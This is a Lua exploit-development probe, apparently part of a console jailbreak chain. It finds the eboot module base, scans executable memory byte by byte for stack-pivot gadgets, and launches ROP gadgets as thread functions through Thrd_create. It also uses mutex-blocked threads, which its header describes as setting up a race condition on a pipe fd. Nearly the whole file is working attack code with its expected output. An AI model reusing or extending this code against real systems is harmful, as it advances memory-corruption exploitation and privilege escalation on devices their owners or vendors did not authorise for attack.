-- CRASH_CLASS: MODERATE
-- PROBE 127a: Thread with ROP chain via stack pivot
-- Use Thrd_create + stack pivot gadget to give thread a full ROP chain
-- Thread ROP chain closes a pipe fd (race condition setup)

print("=== PROBE 127a: THREAD ROP CHAIN ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local function make_sc(num)
    local sc = {}
    for k, v in pairs(syscall.pipe) do sc[k] = v end
    sc.syscall_no = num
    setmetatable(sc, getmetatable(syscall.pipe))
    return sc
end

-- Section A: Understand how the thread function is called
-- Thrd_create(thr, func, arg): calls func(arg) where rdi=arg
-- If func = gadget that does "pop rsp; ret", and the stack has a return addr
-- that we control... but we don't control the stack.
--
-- Better: func = gadget "mov rsp, rdi; ret" would set rsp=arg
-- Then arg = our ROP chain address
-- But do we have "mov rsp, rdi; ret"?

print("--- SECTION A: FIND PIVOT GADGETS ---")
-- Check stack_pivot gadgets
if gadgets.stack_pivot then
    for i, sp in ipairs(gadgets.stack_pivot) do
        if type(sp) == "table" then
            print(string.format("  pivot[%d]:", i))
            for k, v in pairs(sp) do
                print(string.format("    %s = %s", tostring(k), tostring(v)))
            end
        end
    end
end

-- We have "pop rsp; ret" gadget at gadgets["pop rsp; ret"]
local pop_rsp_ret = gadgets["pop rsp; ret"]
print("pop rsp; ret = " .. tostring(pop_rsp_ret))

-- The thread starts with func(arg):
-- rdi = arg
-- rsp = thread's stack (set up by Thrd_create)
-- [rsp] = return address (Thrd_create's cleanup)
--
-- If func = "pop rsp; ret":
--   pops top of stack into rsp → rsp = Thrd_create's cleanup address (NOT what we want)
--   then ret → jumps to whatever new [rsp] is
--
-- We need a way to get rdi (our arg) into rsp.
-- Look for: "xchg rdi, rsp; ret" or "push rdi; pop rsp; ret" or "mov rsp, rdi; ret"

-- Let's scan eboot for "mov rsp, rdi" = 48 89 FC (actually 48 89 F4 is mov rsp, rsi)
-- "mov rsp, rdi" = REX.W MOV r/m64, r64 = 48 89 /r where src=rdi(7), dst=rsp(4)
-- ModRM: 11 111 100 = 0xFC
-- So bytes: 48 89 FC C3 (mov rsp, rdi; ret)

print("")
print("--- SECTION B: SCAN FOR MOV RSP, RDI ---")
local eboot_text = eboot_addrofs.luaL_optinteger -- known eboot RX address
-- We need eboot base
local info = memory.alloc(0x200)
memory.write_dword(info, 0x160)
local getmodinfo = fcall(libc_addrofs.sceKernelGetModuleInfoFromAddr)
getmodinfo(eboot_text, 1, uint64(info))
local eboot_base = memory.read_qword(info + 0x108)
local eboot_size_lo = to_num(memory.read_dword(info + 0x128)) - to_num(memory.read_dword(info + 0x108))
print("eboot_base=" .. tostring(eboot_base))
print("eboot_size=" .. eboot_size_lo)

-- Scan for 48 89 FC C3 (mov rsp, rdi; ret)
-- Also 48 94 C3 (xchg rsp, rax; ret) and 48 87 FC C3 (xchg rsp, rdi)
local found_pivots = {}
local scan_size = math.min(eboot_size_lo, 0x600000)
for off = 0, scan_size - 4, 1 do
    local ok, b0 = pcall(memory.read_byte, eboot_base + off)
    if not ok then break end
    if to_num(b0) == 0x48 then
        local ok1, b1 = pcall(memory.read_byte, eboot_base + off + 1)
        local ok2, b2 = pcall(memory.read_byte, eboot_base + off + 2)
        if ok1 and ok2 then
            local v1 = to_num(b1)
            local v2 = to_num(b2)
            -- mov rsp, rdi: 48 89 FC
            if v1 == 0x89 and v2 == 0xFC then
                local ok3, b3 = pcall(memory.read_byte, eboot_base + off + 3)
                if ok3 and to_num(b3) == 0xC3 then
                    found_pivots[#found_pivots+1] = {off=off, name="mov rsp, rdi; ret"}
                    print(string.format("  FOUND: mov rsp, rdi; ret at +0x%X", off))
                end
            end
            -- xchg rsp, rdi: 48 87 FC (or 48 87 E7)
            if v1 == 0x87 and (v2 == 0xFC or v2 == 0xE7) then
                local ok3, b3 = pcall(memory.read_byte, eboot_base + off + 3)
                if ok3 and to_num(b3) == 0xC3 then
                    found_pivots[#found_pivots+1] = {off=off, name="xchg rsp, rdi; ret"}
                    print(string.format("  FOUND: xchg rsp, rdi; ret at +0x%X", off))
                end
            end
        end
    end
    -- Limit scan time
    if off > 0 and off % 0x100000 == 0 then
        print(string.format("  scanned 0x%X bytes...", off))
    end
end
print("found " .. #found_pivots .. " pivot gadgets")

-- Section C: Alternative approach - use push rdi; ... ; pop rsp; ret sequence
-- Actually simpler: use the fact that the thread function's first arg is in rdi.
-- If we create a function-like trampoline at a fixed address:
--   push rdi      (51 → but that's push rcx. push rdi = 57)
--   pop rsp       (5C)
--   ret            (C3)
-- These bytes are 57 5C C3. Scan for them.

print("")
print("--- SECTION C: SCAN FOR PUSH RDI; POP RSP; RET ---")
for off = 0, scan_size - 3, 1 do
    local ok, b0 = pcall(memory.read_byte, eboot_base + off)
    if not ok then break end
    if to_num(b0) == 0x57 then  -- push rdi
        local ok1, b1 = pcall(memory.read_byte, eboot_base + off + 1)
        local ok2, b2 = pcall(memory.read_byte, eboot_base + off + 2)
        if ok1 and ok2 then
            -- push rdi (57); pop rsp (5C); ret (C3)
            if to_num(b1) == 0x5C and to_num(b2) == 0xC3 then
                found_pivots[#found_pivots+1] = {off=off, name="push rdi; pop rsp; ret"}
                print(string.format("  FOUND: push rdi; pop rsp; ret at +0x%X", off))
            end
        end
    end
    if off > 0 and off % 0x100000 == 0 then
        print(string.format("  scanned 0x%X bytes...", off))
    end
end

-- Section D: If no pivot found, try alternative thread approach
-- Use "inc dword [rax]; ret" with rax = shared (set via Thrd_create arg)
-- Wait, rax isn't rdi. We need rax = shared.
--
-- Alternative: thread calls Mtx_lock(mutex) which spins.
-- Main thread does the race work, then unlocks.

print("")
print("--- SECTION D: PROOF OF THREAD EXECUTION ---")
-- Use mov [rdi], eax; ret with rdi=shared, verify eax value changes it
local shared = memory.alloc(64)
memory.write_qword(shared, uint64(0xDEADDEADDEADDEAD))

local thrd_create_fn = fcall(libc_addrofs.Thrd_create)
local thrd_join_fn = fcall(libc_addrofs.Thrd_join)

-- gadgets["mov [rdi], eax; ret"] writes low 32 bits of eax to [rdi]
local mov_rdi_eax = gadgets["mov [rdi], eax; ret"]
print("mov [rdi], eax; ret = " .. tostring(mov_rdi_eax))

local thr_buf = memory.alloc(8)
memory.write_qword(thr_buf, 0)

local ok, ret = pcall(thrd_create_fn, thr_buf, mov_rdi_eax, shared)
print("create: ok=" .. tostring(ok) .. " ret=" .. tostring(ret))
if ok and to_num(ret) == 0 then
    sleep(0.1, 's')
    pcall(thrd_join_fn, memory.read_qword(thr_buf), uint64(0))
    local after = memory.read_qword(shared)
    local h, l = get_hi_lo(after)
    print(string.format("shared after: 0x%08X%08X (was 0xDEADDEADDEADDEAD)", h, l))
    if h ~= 0xDEADDEAD or l ~= 0xDEADDEAD then
        print("*** THREAD WROTE TO MEMORY! ***")
    end
end

-- Section E: Use Mtx_init + Mtx_lock for thread blocking
print("")
print("--- SECTION E: MUTEX THREAD BLOCK ---")
local mtx = memory.alloc(64)
-- Initialize mutex
local mtx_init = fcall(libc_addrofs.Mtx_init)
local ok_init = pcall(mtx_init, mtx, uint64(0))
print("Mtx_init: " .. tostring(ok_init))

-- Lock it from main thread
local mtx_lock = fcall(libc_addrofs.Mtx_lock)
local ok_lock = pcall(mtx_lock, mtx)
print("Mtx_lock(main): " .. tostring(ok_lock))

-- Create thread that tries to lock the same mutex
-- Thread will BLOCK until we unlock
local thr_buf2 = memory.alloc(8)
memory.write_qword(thr_buf2, 0)

local ok2, ret2 = pcall(thrd_create_fn, thr_buf2, libc_addrofs.Mtx_lock, mtx)
print("Thrd_create(Mtx_lock, mtx): ok=" .. tostring(ok2) .. " ret=" .. tostring(ret2))

if ok2 and to_num(ret2) == 0 then
    print("Thread is BLOCKED on mutex!")
    sleep(0.2, 's')

    -- Thread should still be alive (blocked)
    print("Unlocking mutex...")
    local mtx_unlock = fcall(libc_addrofs.Mtx_unlock)
    pcall(mtx_unlock, mtx)

    sleep(0.1, 's')
    pcall(thrd_join_fn, memory.read_qword(thr_buf2), uint64(0))
    print("Thread joined after unlock")
end

print("canary: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))
print("=== PROBE 127a COMPLETE ===")
